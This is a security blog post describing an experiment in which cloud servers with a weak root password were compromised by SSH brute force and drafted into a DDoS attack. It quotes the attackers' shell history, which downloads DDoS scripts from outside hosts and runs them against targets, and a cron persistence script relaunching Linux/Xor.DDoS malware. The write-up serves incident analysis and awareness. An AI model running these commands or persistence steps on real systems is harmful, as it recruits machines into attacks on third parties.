@@ -1,0 +1,65 @@
+SSH Brute Force Compromises Leading to DDoS
+
+A few weeks ago we ran an experiment to see how long it would take for some IPv4-only and  IPv6-only servers to be compromised via SSH brute force attacks.
+We configured five cloud servers on Linode and Digital Ocean with the root password set to “password.”  The idea was to see how long it would take before the servers were hacked.
+
+My experiment: Setting up an ipv4 and an ipv6 server in the cloud. SSH open with root password “password”. How long until they are hacked?
+— Daniel Cid (@danielcid) September 6, 2016
+
+The IPv4 experiment did not last very long because within 12 minutes the first server was hacked. The others were also hacked shortly afterward.
+The IPv6 servers, however, had much better results. After one week, they have not been attacked (much less compromised). What we can draw from this is that the obscurity of IPv6 helps to minimize the noise of attacks. Most likely, this is because it is more difficult to map the range of IPv6 addresses (2^128) than it is with the range of IPv4 addresses (2^32).
+Logs from one server getting hacked within 12 minutes.
+SSH Brute Force Leads to DDoS
+That was not the end of our SSH brute force experiment. Shortly after the initial compromise (before we had the time to kill the server) we got this notice from Digital Ocean:
+We got alerted that SSH-TEST-SERVER-X was participating in a SYN flood along with 4 other droplets on 3 other customers aimed at 118.184.XX.YY. This was happening at about 800mbps or so; after pulling a tcpdump and validating the pcap we took action on all 4 droplets.
+Right now the droplet has the networking disabled to stop the outgoing attack, and please let us know if we can help resolve this.
+Regards,
+Trust & Safety,
+Digital Ocean Support
+Oh shoot! Our little experiment server was used to DDoS a poor victim in China. We didn’t expect attackers to use it so quickly after the initial compromise. Immediately we copied the hard drive from the experiment server and shut it off. We then performed an investigation to find out what the attackers had done.
+Investigation of DDoS Attacks
+First of all, we looked at the logged history and found some of the commands they executed:
+7 cat /proc/cpuinfo
+8 ls
+9 wget http://werwolf.3x.ro/dos.py
+10 ls
+11 python
+12 ls
+13 python dos.py
+14 python dos.py http://exploratoriivrancei.blogspot.ro
+15 ls
+16 wget arhivewolf.3x.ro/down.pl
+17 perl down.pl 92.80.190.15
+18 cd
+19 ls
+20 passwd
+21 uptime
+22 free -m
+23 uptime
+24 wget http://wolf.16mb.com/viteza.py
+25 python viteza.py
+Here we can see three tools being downloaded – dos.py, down.pl and viteza.py – which are used for specific DDoS attacks.
+Truitt Allen, from our SOC group, came to help with the investigation. In addition, he found backdoors and a cron job running every hour to re-enable the malware in case it gets removed:
+# cat /etc/cron.hourly/gcc.sh
+#!/bin/sh
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
+for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do ifconfig $i up& done
+cp /lib/libudev.so /lib/libudev.so.6
+/lib/libudev.so.6
+The init scripts were modified to load the malware during boot:
+/etc/rc.d/rc2.d
+/etc/rc.d/rc2.d/S90yxruhbcgee
+/etc/rc.d/rc3.d
+/etc/rc.d/rc3.d/S90yxruhbcgee
+/etc/rc.d/rc5.d
+/etc/rc.d/rc5.d/S90yxruhbcgee
+/etc/rc.d/init.d/yxruhbcgee
+/etc/rc.d/rc1.d
+/etc/rc.d/rc1.d/S90yxruhbcgee
+/etc/rc.d/rc4.d
+/etc/rc.d/rc4.d/S90yxruhbcgee
+Furthermore, the scripts executed a binary at /usr/bin/yxruhbcgee (which seems to be randomly created). After some inspection of that binary, we recognized it as the infamous Linux/Xor.DDoS malware. We won’t go through our investigation of it, as Bart already did it very well on the link above. We recommend reading about it, but as the name suggests, it is another DDoS toolkit that runs on Linux.
+What’s even scarier is that the attackers injected all hacked servers with the same type of code, likely to be used for the same purpose (DDoS).
+Conclusion
+The first lesson we learned is to be more careful with these experiments. Next time, we will disable networking right away after being compromised. We also learned some interesting facts about the benefits of obscurity through IPv6 as it helps reduce the noise of attacks.
+In addition to this, SSH brute force attacks are clearly still persistent, with attacks using compromised servers almost immediately to perform DDoS attacks. When you add the power of these servers with hacked IoT devices, you probably have enough power to generate large attacks like the one that took down Brian Krebs last week.
